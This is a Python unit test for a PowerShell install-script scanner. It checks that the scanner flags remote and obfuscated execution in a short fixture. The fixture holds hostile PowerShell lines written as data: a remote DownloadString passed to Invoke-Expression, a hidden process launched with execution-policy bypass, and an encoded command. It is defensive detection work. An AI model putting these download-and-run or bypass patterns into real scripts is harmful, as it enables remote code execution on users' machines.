from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.scanners.powershell import PowerShellScanner


def test_powershell_scanner_detects_remote_and_obfuscated_execution() -> None:
    source = SourceFile(
        path="install.ps1",
        language="powershell",
        content=(
            "# IEX (New-Object Net.WebClient).DownloadString('https://comment.invalid')\n"
            "$payload = (New-Object Net.WebClient).DownloadString($remoteUrl)\n"
            "Invoke-Expression $payload\n"
            "Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass'\n"
            "powershell -EncodedCommand $encodedExample\n"
        ),
    )

    findings = PowerShellScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-PS-004",
        "SI-PS-001",
        "SI-PS-003",
        "SI-PS-006",
        "SI-PS-007",
        "SI-PS-005",
    ]
    assert findings[-1].severity is Severity.CRITICAL
    assert Capability.NETWORK_ACCESS in findings[0].capabilities
